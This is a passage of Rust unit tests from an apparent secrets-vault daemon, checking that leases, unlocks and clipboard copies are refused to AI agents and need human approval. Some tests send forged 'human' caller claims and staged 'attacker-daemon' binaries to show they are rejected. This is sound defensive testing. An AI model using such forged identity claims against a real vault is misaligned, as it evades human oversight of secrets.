        store::ensure_dir(&p.keys()).unwrap();
        let cfg = store::Config { removed_defaults: store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| s.to_string()).collect(), ..Default::default() };
        store::save_config(&p, &cfg).unwrap();
        let pk = B64.encode(p256::SecretKey::from_slice(&[7; 32]).unwrap().public_key().to_encoded_point(false).as_bytes());
        store::write_atomic(&p.pubkeys(), &serde_json::to_vec(&json!({"bio": pk, "open": pk})).unwrap()).unwrap();
        let v = Karambit { paths: p.clone(), cfg, caller: Default::default(), run_cmd: None };
        for name in names {
            let f = v.build_file(name, store::Tier::Bio, false, false, &crypto::new_dek(), b"synthetic grant", &v.pubkeys_local().unwrap(), None).unwrap();
            store::save_secret(&p, &f).unwrap();
        }
        (p, Ctx::new(State::default()))
    }

    #[test]
    fn approval_names_counts_and_refuses_what_would_be_cut() {
        let names = |n: &[&str]| n.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert_eq!(approval_names(&names(&["a/x"])).unwrap(), "1 secret: a/x");
        assert_eq!(approval_names(&names(&["a/x", "b/y", "c/z"])).unwrap(), "3 secrets: a/x, b/y, c/z");
        // 12 names of 12 characters do not fit in 120: refused, never shortened.
        let many: Vec<String> = (0..12).map(|i| format!("proj/key-{i:03}")).collect();
        let error = approval_names(&many).unwrap_err().to_string();
        assert!(error.contains("too many secrets for one prompt"), "{error}");
        assert!(approval_names(&names(&[&"n".repeat(115)])).is_err(), "the count prefix counts against the limit");
    }

    #[test]
    fn lease_grant_refuses_a_names_list_the_prompt_would_cut() {
        let names: Vec<String> = (0..8).map(|i| format!("proj/long-secret-name-{i}-{}", "x".repeat(8))).collect();
        let (p, st) = grant_fixture("grant-long", &names);
        let calls = Rc::new(Cell::new(0));
        software_ecdh(calls.clone());
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("no prompt may be shown for a list that does not fit"))));
        let grant = |names: Vec<String>| Req::GrantLease { names, grantee: Grantee::Any, hours: 1.0, scope: Scope::default() };
        let error = handle(&p, &st, std::process::id() as i32, grant(names.clone()), 0).unwrap_err().to_string();
        assert!(error.contains("too many secrets for one prompt"), "{error}");
        assert!(st.lock().unwrap().leases.is_empty());
        assert_eq!(calls.get(), 0, "refused before any Touch ID unwrap");
        // The human unlock path approves names the same way.
        let error = handle(&p, &st, std::process::id() as i32, Req::HumanUnlock { names: names.clone() }, 0).unwrap_err().to_string();
        assert!(error.contains("too many secrets for one prompt"), "{error}");
        assert_eq!(calls.get(), 0);
        helper::AUTH_HOOK.with(|h| { h.borrow_mut().take(); });
        // A narrower grant is approved, and the lease exists.
        software_ecdh(calls.clone());
        handle(&p, &st, std::process::id() as i32, grant(names[..2].to_vec()), 0).unwrap();
        assert_eq!(st.lock().unwrap().leases.len(), 2);
        assert_eq!(calls.get(), 1);
        std::fs::remove_dir_all(&p.root).unwrap();
    }

    #[test]
    fn lease_grant_refuses_a_scope_the_prompt_would_cut() {
        let (p, st) = grant_fixture("grant-scope", &["proj/key".to_string()]);
        let script = p.root.join("deploy.js");
        std::fs::write(&script, "1").unwrap();
        // Long script path: the prompt's scope field would hide the end of it.
        let deep = p.root.join("d".repeat(130));
        std::fs::create_dir(&deep).unwrap();
        let long = deep.join("deploy.js");
        std::fs::write(&long, "1").unwrap();
        let node = p.root.join("node");
        std::fs::copy("/usr/bin/true", &node).unwrap();
        let grant = |script: &Path| Req::GrantLease { names: vec!["proj/key".into()], grantee: Grantee::Any, hours: 1.0,
            scope: Scope { cmds: vec![CommandBinding::Script { path: node.to_str().unwrap().into(), sha256: String::new(),
                script: script.to_str().unwrap().into(), script_sha256: String::new() }], ..Scope::default() } };
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("no prompt for a scope that does not fit"))));
        let error = handle(&p, &st, std::process::id() as i32, grant(&long), 0).unwrap_err().to_string();
        assert!(error.contains("too long for one prompt"), "{error}");
        helper::AUTH_HOOK.with(|h| { h.borrow_mut().take(); });
        std::fs::remove_dir_all(&p.root).unwrap();
        let _ = script;
    }

    #[test]
    fn lease_grant_refuses_bare_interpreters_and_pins_script_pairs() {
        let (p, st) = grant_fixture("grant-interp", &["proj/key".to_string()]);
        let node = p.root.join("node");
        std::fs::copy("/usr/bin/true", &node).unwrap();
        let script = p.root.join("deploy.js");
        std::fs::write(&script, "1").unwrap();
        let (node, script) = (node.to_str().unwrap().to_string(), script.to_str().unwrap().to_string());
        let calls = Rc::new(Cell::new(0));
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("a refused scope must not prompt"))));
        software_ecdh(calls.clone());
        let grant = |cmds: Vec<CommandBinding>| Req::GrantLease { names: vec!["proj/key".into()], grantee: Grantee::Any, hours: 1.0, scope: Scope { cmds, ..Scope::default() } };
        let error = handle(&p, &st, std::process::id() as i32, grant(vec![CommandBinding::from(node.as_str())]), 0).unwrap_err().to_string();
        assert!(error.contains("interpreters are not permitted"), "{error}");
        assert!(st.lock().unwrap().leases.is_empty());
        helper::AUTH_HOOK.with(|h| { h.borrow_mut().take(); });
        let pair = CommandBinding::Script { path: node.clone(), sha256: String::new(), script: script.clone(), script_sha256: String::new() };
        handle(&p, &st, std::process::id() as i32, grant(vec![pair]), 0).unwrap();
        let held = st.lock().unwrap().leases["proj/key"].scope.clone();
        assert!(matches!(&held.cmds[0], CommandBinding::Script { script_sha256, .. } if script_sha256.len() == 64));
        assert!(held.label().contains(&script), "the prompt names the script: {}", held.label());
        std::fs::remove_dir_all(&p.root).unwrap();
    }
}

fn peer_vault(p: &Paths, peer: &agent::Peer) -> Result<crate::Karambit> {
    Ok(crate::Karambit { paths: p.clone(), cfg: store::load_config(p)?, caller: peer.caller.clone(), run_cmd: None })
}

fn init_vault(v: &mut crate::Karambit, backup_recipient: Option<String>) -> Result<Value> {
    let paths = v.paths.clone();
    let caller = v.caller.clone();
    crate::audit::run(&paths, "init-operation", &[], &caller, json!({}), || {
        if v.paths.initialized() {
            bail!("already initialized at {}", v.paths.root.display());
        }
        if let Some(r) = &backup_recipient {
            r.parse::<age::x25519::Recipient>().map_err(|e| anyhow::anyhow!("bad recipient: {e}"))?;
        }
        store::ensure_dir(&v.paths.root)?;
        let pk = crate::platform::helper::keygen(&v.paths.keys())?;
        store::write_atomic(&v.paths.pubkeys(), &serde_json::to_vec_pretty(&pk.to_json())?)?;
        v.cfg.backup_recipient = backup_recipient;
        store::save_config(&v.paths, &v.cfg)?;
        v.audit("init", &[], json!({"backup": v.cfg.backup_recipient.is_some()}), &Ok(()));
        Ok(json!({"root": v.paths.root, "backup": v.cfg.backup_recipient}))
    })
}

fn vault_status(v: &crate::Karambit) -> Result<Value> {
    let se = crate::platform::helper::selftest().unwrap_or_else(|e| json!({"error": e.to_string()}));
    let secrets = if v.paths.initialized() { store::list_secrets(&v.paths)? } else { vec![] };
    let unbacked = secrets.iter().filter(|s| s.backup.is_none()).count();
    let stale = v.lock_unsafe(&secrets).len();
    Ok(json!({
        "root": v.paths.root,
        "initialized": v.paths.initialized(),
        "secrets": secrets.len(),
        "without_backup": unbacked,
        "backup_recipient": v.cfg.backup_recipient,
        // Set while `backup rotate` is unfinished: some copies may need the new paper key.
        "backup_rotation": v.cfg.backup_rotation,
        "default_tier": v.cfg.default_tier,
        "agent_key": v.paths.has_agent_key(),
        // Agent-enabled secrets that still stop working when the screen locks.
        "locked_screen_blocked": stale,
        "caller": v.caller,
        "helper": se,
    }))
}


#[cfg(test)]
mod bootstrap_routing_tests {
    use super::*;
    use crate::platform::helper;
    use std::{cell::Cell, rc::Rc};

    fn paths(label: &str) -> Paths {
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-bootstrap-{label}-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
        store::ensure_dir(&p.root).unwrap();
        p
    }

    #[test]
    fn library_init_dispatches_before_keygen_and_preserves_peer() {
        let p = paths("init");
        let state = Rc::new(Ctx::new(State::default()));
        REQUEST_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |p, req| {
            assert!(matches!(req, Req::Init { .. }));
            let mut peer = agent::Peer::default();
            peer.caller.chain = vec!["kernel-fixture".into()];
            handle_as(p, &state, peer, serde_json::from_value(serde_json::to_value(req)?)?, 0, None, Ok)
        })));
        let called = Rc::new(Cell::new(false));
        let flag = called.clone();
        helper::KEYGEN_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| {
            assert!(crate::audit::current_intent().is_some());
            flag.set(true);
            Ok(helper::PubKeys { bio: vec![1], open: vec![2], agent: None })
        })));
        let mut v = crate::Karambit { paths: p.clone(), cfg: store::Config::default(), caller: agent::Caller::gui(), run_cmd: None };
        v.init(None).unwrap();
        assert!(called.get());
        let entries = crate::audit::read(&p, usize::MAX).unwrap();
        assert!(entries.iter().any(|e| e["action"] == "daemon-init" && e["phase"] == "intent"));
        assert!(entries.iter().any(|e| e["action"] == "init-operation" && e["caller"] == json!(["kernel-fixture"])));
        REQUEST_HOOK.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn bootstrap_failed_intent_does_not_call_keygen() {
        let p = paths("intent");
        let calls = Rc::new(Cell::new(0));
        let count = calls.clone();
        helper::KEYGEN_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| {
            count.set(count.get()+1);
            bail!("must not execute")
        })));
        crate::audit::fail_phase(Some("intent"));
        let result = handle_as(&p, &Ctx::new(State::default()), agent::Peer::default(), Req::Init { backup_recipient: None }, 0, None, Ok);
        crate::audit::fail_phase(None);
        assert!(result.is_err());
        assert_eq!(calls.get(), 0);
        assert!(!p.initialized());
        helper::KEYGEN_HOOK.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn raw_helper_pin_ignores_asserted_human_identity() {
        let p = paths("peer");
        let parent = agent::proc_exe(unsafe { libc::getppid() }).unwrap();
        let name = Path::new(&parent).file_name().unwrap().to_str().unwrap().to_owned();
        let cfg = store::Config { agent_process_names: vec![name], ..Default::default() };
        store::save_config(&p, &cfg).unwrap();
        let req = serde_json::from_value(json!({"op":"helper_pin", "caller":{"agent":null,"chain":["human"]}, "agent":false})).unwrap();
        store::ensure_dir(&p.keys()).unwrap();
        let candidate = p.root.join("synthetic-helper");
        std::fs::write(&candidate, b"synthetic non-executable helper").unwrap();
        std::fs::write(p.keys().join("helper.sha256"), format!("{}\n", helper::sha256_file(&candidate).unwrap())).unwrap();
        helper::PIN_CURRENT_FIXTURE.with(|h| *h.borrow_mut() = Some((p.clone(), vec![candidate])));
        let calls = Rc::new(Cell::new(0));
        let count = calls.clone();
        helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_, _| { count.set(count.get()+1); Ok(json!({"ok":true})) })));
        let count = calls.clone();
        helper::KEYGEN_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { count.set(count.get()+1); bail!("unexpected keygen") })));
        let count = calls.clone();
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { count.set(count.get()+1); bail!("unexpected ecdh") })));
        let count = calls.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { count.set(count.get()+1); Ok(()) })));
        let err = handle(&p, &Ctx::new(State::default()), std::process::id() as i32, req, 0).unwrap_err();
        assert!(err.to_string().contains("human-only"), "{err:#}");
        assert_eq!(calls.get(), 0, "unauthorized request must not reach any helper seam");
        let before = std::fs::read(p.keys().join("helper.sha256")).unwrap();
        let req = serde_json::from_value(json!({"op":"helper_pin", "stage_daemon":p.root.join("attacker-daemon"), "stage_helper":p.root.join("attacker-helper")})).unwrap();
        let err = handle(&p, &Ctx::new(State::default()), std::process::id() as i32, req, 0).unwrap_err();
        assert!(err.to_string().contains("human-only"), "{err:#}");
        assert_eq!(calls.get(), 0, "staged request must not launch helpers");
        assert_eq!(std::fs::read(p.keys().join("helper.sha256")).unwrap(), before);
        assert!(!p.keys().join("daemon.sha256").exists());
        helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
        helper::KEYGEN_HOOK.with(|h| h.borrow_mut().take());
        helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
        helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
        helper::PIN_CURRENT_FIXTURE.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn bootstrap_audit_uses_kernel_caller_not_wire_claim() {
        let p = paths("claim");
        let parent = agent::proc_exe(unsafe { libc::getppid() }).unwrap();
        let name = Path::new(&parent).file_name().unwrap().to_str().unwrap().to_owned();
        store::save_config(&p, &store::Config { agent_process_names: vec![name], ..Default::default() }).unwrap();
        // Public-key metadata needs no human proof, but attribution still must
        // come from the kernel, even when the wire claims a human caller.
        store::ensure_dir(&p.keys()).unwrap();
        store::write_atomic(&p.pubkeys(), &serde_json::to_vec(&json!({"bio":"AQ==","open":"Ag=="})).unwrap()).unwrap();
        let req = serde_json::from_value(json!({"op":"pub_keys", "caller":{"agent":null,"chain":["human"]}, "agent":false})).unwrap();
        handle(&p, &Ctx::new(State::default()), std::process::id() as i32, req, 0).unwrap();
        let entries = crate::audit::read(&p, usize::MAX).unwrap();
        assert!(entries.iter().any(|e| e["action"] == "daemon-pubkeys" && e["agent"].is_string()), "wire claim must not erase kernel agent");
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn bootstrap_clients_have_no_direct_helper_launches() {
        let lib = include_str!("lib.rs");
        let bootstrap = lib.split("pub fn init(").nth(1).unwrap().split("/// No-prompt agent/public").next().unwrap();
        for verb in ["keygen", "selftest", "pin_current"] {
            assert!(!bootstrap.contains(&format!("helper::{verb}(")));
        }
        assert!(!include_str!("../../cli/src/main.rs").contains("helper::pin_current("));
        assert!(!include_str!("../../../app/src-tauri/src/main.rs").contains("helper::selftest("));
    }
}

#[cfg(test)]
pub(crate) fn install_unlock_test_dispatch() {
    let state = Ctx::new(State::default());
    REQUEST_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |p, req| {
        handle_as(p, &state, agent::Peer::default(), serde_json::from_value(serde_json::to_value(req)?)?, 0, None, Ok)
    })));
}

#[cfg(test)]
mod unlock_routing_tests {
    use super::*;
    use crate::{platform::helper, Tier};
    use std::{cell::Cell, rc::Rc, sync::mpsc};

    pub(super) fn fixture(label: &str) -> Paths {
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-unlock-{label}-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
        store::ensure_dir(&p.keys()).unwrap();
        std::fs::write(p.keys().join("bio.key"), b"synthetic").unwrap();
        std::fs::write(p.keys().join("open.key"), b"synthetic").unwrap();
        store::save_config(&p, &store::Config::default()).unwrap();
        use p256::elliptic_curve::sec1::ToEncodedPoint;
        let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
        let pk = helper::PubKeys { bio: sk.public_key().to_encoded_point(false).as_bytes().to_vec(), open: sk.public_key().to_encoded_point(false).as_bytes().to_vec(), agent: None };
        store::write_atomic(&p.pubkeys(), &serde_json::to_vec(&pk.to_json()).unwrap()).unwrap();
        let v = peer_vault(&p, &agent::Peer::default()).unwrap();
        let f = v.build_file("test/private", Tier::Open, false, false, &crate::crypto::new_dek(), b"synthetic", &pk, None).unwrap();
        store::save_secret(&p, &f).unwrap();
        p
    }

    fn request(sso: bool) -> Req {
        serde_json::from_value(json!({"op":"unlock", "names":["test/private"], "action":"run", "context":null, "cmd":null,
            "sso_profile":if sso { Some("test/private") } else { None }, "ttl":60,
            "caller":{"agent":null,"chain":["human"]}, "human":true, "agent":false})).unwrap()
    }

    #[test]
    fn raw_unlock_ignores_wire_human_and_refuses_agent_before_all_helper_work() {
        assert_raw_unlock_refused(false);
    }

    #[test]
    fn raw_unlock_sso_refuses_agent_before_helper_or_endpoint() {
        assert_raw_unlock_refused(true);
    }

    fn assert_raw_unlock_refused(sso: bool) {
        let p = fixture(if sso { "raw-sso" } else { "raw" });
        let mut cfg = store::load_config(&p).unwrap();
        cfg.agent_env_markers.push(agent::SYNTHETIC_AGENT_MARKER.into());
        store::save_config(&p, &cfg).unwrap();
        let calls = Rc::new(Cell::new(0));
        let count = calls.clone();
        helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_,_| { count.set(count.get()+1); bail!("unexpected helper") })));
        let count = calls.clone();
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { count.set(count.get()+1); bail!("unexpected ecdh") })));
        let count = calls.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { count.set(count.get()+1); bail!("unexpected auth") })));
        let st = Ctx::new(State::default());
        {
            let err = handle(&p, &st, std::process::id() as i32, request(sso), 0).unwrap_err();
            assert_eq!(calls.get(), 0, "unauthorized unlock must not call any helper seam");
            assert!(err.to_string().contains("not allowed"), "{err:#}");
            assert!(st.lock().unwrap().aws.is_empty());
        }
        helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
        helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
        helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn send_only_close_removes_endpoint_even_when_response_fails() {
        let p = fixture("close-only");
        store::ensure_dir(&run_dir(&p)).unwrap();
        let listener = UnixListener::bind(sock_path(&p)).unwrap();
        let st = Arc::new(Ctx::new(State::default()));
        let r = handle_as(&p, &st, agent::Peer::default(), Req::AwsOpen {
            profile: "synthetic".into(), creds: "synthetic".into(), ttl: 60,
        }, 0, None, Ok).unwrap();
        let id = r["id"].as_str().unwrap().to_owned();
        let (dropped_tx, dropped_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let server = std::thread::spawn(move || {
            let (mut stream, _) = listener.accept().unwrap();
            let mut line = String::new();
            BufReader::new(stream.try_clone().unwrap()).read_line(&mut line).unwrap();
            dropped_rx.recv_timeout(Duration::from_millis(500)).unwrap();
            let mut peer = agent::Peer::default(); peer.caller.agent = Some("synthetic-agent".into());
            crate::audit::fail_phase(Some("all"));
            let result = handle_as(&paths, &state, peer, serde_json::from_str(&line).unwrap(), 0, None, |response| {
                write_response(&mut stream, &response)?; Ok(response)
            });
            crate::audit::fail_phase(None);
            assert!(result.is_err(), "closed peer must fail response write, after containment");
        });
        close_endpoint_best_effort(&p, &id);
        dropped_tx.send(()).unwrap();
        let deadline = Instant::now() + Duration::from_millis(500);
        while st.lock().unwrap().aws.contains_key(&id) && Instant::now() < deadline {
            std::thread::sleep(Duration::from_millis(5));
        }
        assert!(!st.lock().unwrap().aws.contains_key(&id));
        server.join().unwrap();
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn run_unredacted_refuses_agent_and_failed_intent_before_auth() {
        let p = fixture("unredacted");
        let calls = Rc::new(Cell::new(0));
        let count = calls.clone();
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { count.set(count.get()+1); Ok(()) })));
        let st = Ctx::new(State::default());
        let mut peer = agent::Peer::default();
        peer.caller.agent = Some("synthetic-agent".into());
        let result = handle_as(&p, &st, peer, Req::RunUnredacted { command: "fixture".into() }, 0, None, Ok);
        assert_eq!(calls.get(), 0);
        assert!(result.is_err());
        crate::audit::fail_phase(Some("intent"));
        let result = handle_as(&p, &st, agent::Peer::default(), Req::RunUnredacted { command: "fixture".into() }, 0, None, Ok);
        crate::audit::fail_phase(None);
        assert!(result.is_err()); assert_eq!(calls.get(), 0);
        // The approval is bound to the requesting process, so the peer must be a real one.
        let me = agent::Peer { pid: std::process::id() as i32, ..Default::default() };
        handle_as(&p, &st, me, Req::RunUnredacted { command: "fixture".into() }, 0, None, Ok).unwrap();
        assert_eq!(calls.get(), 1);
        assert_eq!(st.lock().unwrap().unredacted_approvals.len(), 1);
        helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn revoke_completes_while_unlock_auth_is_blocked() {
        let p = fixture("blocked");
        let st = Arc::new(Ctx::new(State::default()));
        let (entered_tx, entered_rx) = mpsc::channel();
        let (release_tx, release_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let pending = std::thread::spawn(move || {
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                entered_tx.send(()).unwrap();
                release_rx.recv_timeout(Duration::from_secs(5)).unwrap();
                bail!("synthetic refusal after blocked prompt")
            })));
            let result = handle_as(&paths, &state, agent::Peer::default(), request(false), 0, None, Ok);
            helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
            assert!(result.is_err());
        });
        entered_rx.recv_timeout(Duration::from_secs(3)).unwrap();
        let (done_tx, done_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let revoke = std::thread::spawn(move || {
            done_tx.send(handle_as(&paths, &state, agent::Peer::default(), Req::Revoke { patterns: vec!["*".into()] }, 0, None, Ok).is_ok()).unwrap();
        });
        let completed = done_rx.recv_timeout(Duration::from_secs(1));
        release_tx.send(()).unwrap();
        pending.join().unwrap(); revoke.join().unwrap();
        assert!(completed.unwrap(), "revoke must finish before prompt release");
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn revoke_completes_while_portal_add_auth_is_blocked() {
        let p = fixture("portal-blocked");
        let st = Arc::new(Ctx::new(State::default()));
        let (entered_tx, entered_rx) = mpsc::channel();
        let (release_tx, release_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let pending = std::thread::spawn(move || {
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                entered_tx.send(()).unwrap();
                release_rx.recv_timeout(Duration::from_secs(5)).unwrap();
                bail!("synthetic refusal after blocked prompt")
            })));
            let result = handle_as(&paths, &state, agent::Peer::default(), Req::SsoPortalAdd { name: "main".into(), start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into() }, 0, None, Ok);
            helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
            assert!(result.is_err());
        });
        entered_rx.recv_timeout(Duration::from_secs(3)).unwrap();
        let (done_tx, done_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let revoke = std::thread::spawn(move || {
            done_tx.send(handle_as(&paths, &state, agent::Peer::default(), Req::Revoke { patterns: vec!["*".into()] }, 0, None, Ok).is_ok()).unwrap();
        });
        let completed = done_rx.recv_timeout(Duration::from_secs(1));
        release_tx.send(()).unwrap();
        pending.join().unwrap(); revoke.join().unwrap();
        assert!(completed.unwrap(), "revoke must finish before prompt release");
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn revoke_completes_while_recovery_auth_is_blocked() {
        let p = fixture("recovery-blocked");
        let (identity_text, recipient) = crate::crypto::generate_backup_identity();
        let mut v = peer_vault(&p, &agent::Peer::default()).unwrap();
        v.cfg.backup_recipient = Some(recipient);
        let f = v.build_file("test/paper", Tier::Bio, false, false, &crate::crypto::new_dek(), b"synthetic", &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&p, &f).unwrap();
        let st = Arc::new(Ctx::new(State::default()));
        let (entered_tx, entered_rx) = mpsc::channel();
        let (release_tx, release_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let pending = std::thread::spawn(move || {
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
                entered_tx.send(()).unwrap();
                release_rx.recv_timeout(Duration::from_secs(5)).unwrap();
                bail!("synthetic refusal after blocked prompt")
            })));
            let result = handle_as(&paths, &state, agent::Peer::default(), Req::RecoverFromPaper { identity_text, accept_loss: vec!["test/private".into()] }, 0, None, Ok);
            helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
            assert!(result.is_err());
        });
        entered_rx.recv_timeout(Duration::from_secs(3)).unwrap();
        let (done_tx, done_rx) = mpsc::channel();
        let state = st.clone(); let paths = p.clone();
        let revoke = std::thread::spawn(move || {
            done_tx.send(handle_as(&paths, &state, agent::Peer::default(), Req::Revoke { patterns: vec!["*".into()] }, 0, None, Ok).is_ok()).unwrap();
        });
        let completed = done_rx.recv_timeout(Duration::from_secs(1));
        release_tx.send(()).unwrap();
        pending.join().unwrap(); revoke.join().unwrap();
        assert!(completed.unwrap(), "revoke must finish before prompt release");
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn unlock_response_has_values_but_no_dek() {
        let p = fixture("response");
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|requests| {
            let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
            requests.iter().map(|(_,eph)| {
                let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
            }).collect()
        })));
        let result = handle_as(&p, &Ctx::new(State::default()), agent::Peer::default(), request(false), 0, None, Ok).unwrap();
        assert_eq!(B64.decode(result["values"][0]["value"].as_str().unwrap()).unwrap(), b"synthetic");
        assert!(!result.to_string().contains("dek"));
        helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
        helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    struct CopyHooks;
    impl Drop for CopyHooks {
        fn drop(&mut self) {
            helper::CLIP_HOOK.with(|h| h.borrow_mut().take());
            helper::AUTH_HOOK.with(|h| h.borrow_mut().take());
            helper::ECDH_HOOK.with(|h| h.borrow_mut().take());
            helper::CALL_AT_HOOK.with(|h| h.borrow_mut().take());
        }
    }

    #[test]
    fn copy_returns_only_names_and_duration_and_propagates_clipboard_error() {
        let _hooks = CopyHooks;
        let p = fixture("copy-response");
        let mut cfg = store::load_config(&p).unwrap(); cfg.clip_seconds = 7;
        store::save_config(&p, &cfg).unwrap();
        let st = Ctx::new(State::default());
        for (legacy, unavailable) in [(false, false), (true, false), (false, true)] {
            helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
            helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|requests| {
                let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
                requests.iter().map(|(_, eph)| {
                    let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                    Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                }).collect()
            })));
            let calls = Rc::new(Cell::new(0)); let count = calls.clone(); let paths = p.clone();
            helper::CLIP_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |value, seconds| {
                assert_eq!(value, b"synthetic"); assert_eq!(seconds, 7);
                assert!(crate::audit::current_intent().is_some());
                assert!(!crate::audit::read(&paths, usize::MAX).unwrap().last().unwrap()["action"].as_str().unwrap().is_empty());
                count.set(count.get()+1);
                if unavailable { bail!("clipboard unavailable"); }
                Ok(())
            })));
            let req = if legacy { Req::Unlock { names: vec!["test/private".into()], action: UnlockAction::Copy,
                context: None, cmd: None, gate_open: false, sso_profile: None, ttl: 0 } }
                else { Req::Copy { name: "test/private".into() } };
            let result = handle_as(&p, &st, agent::Peer::default(), req, 0, None, Ok);
            assert_eq!(calls.get(), 1, "exactly one clipboard attempt, no fallback");
            if unavailable {
                assert!(format!("{:#}", result.unwrap_err()).contains("daemon clipboard unavailable; no client fallback"));
            } else {
                let value = result.unwrap();
                assert_eq!(value, json!({"copied":["test/private"],"clears_in":7}));
                assert!(!value.to_string().contains("synthetic"));
                assert!(!value.to_string().contains(&B64.encode(b"synthetic")));
            }
        }
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn raw_copy_agent_and_failed_intent_refuse_before_all_helper_work() {
        let _hooks = CopyHooks;
        let p = fixture("copy-refused");
        let mut cfg = store::load_config(&p).unwrap();
        cfg.agent_env_markers.push(agent::SYNTHETIC_AGENT_MARKER.into());
        store::save_config(&p, &cfg).unwrap();
        let calls = Rc::new(Cell::new(0));
        let c = calls.clone(); helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { c.set(c.get()+1); bail!("unexpected auth") })));
        let c = calls.clone(); helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_| { c.set(c.get()+1); bail!("unexpected ECDH") })));
        let c = calls.clone(); helper::CALL_AT_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_,_| { c.set(c.get()+1); bail!("unexpected call_at") })));
        let c = calls.clone(); helper::CLIP_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |_,_| { c.set(c.get()+1); bail!("unexpected clip") })));
        let st = Ctx::new(State::default());
        let req = serde_json::from_value(json!({"op":"copy","name":"test/private","caller":{"agent":null},"human":true})).unwrap();
        let result = handle(&p, &st, std::process::id() as i32, req, 0);
        assert_eq!(calls.get(), 0); assert!(result.unwrap_err().to_string().contains("agent"));
        crate::audit::fail_phase(Some("intent"));
        let result = handle_as(&p, &st, agent::Peer::default(), Req::Copy { name: "test/private".into() }, 0, None, Ok);
        crate::audit::fail_phase(None);
        assert!(result.is_err()); assert_eq!(calls.get(), 0);
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn portal_limit_delivery_is_inside_its_persisted_classification_barrier() {
        let _hooks = CopyHooks;
        let p = fixture("limit-delivery");
        let mut cfg = store::load_config(&p).unwrap();
        cfg.sso_portals.insert("main".into(), store::SsoPortal {
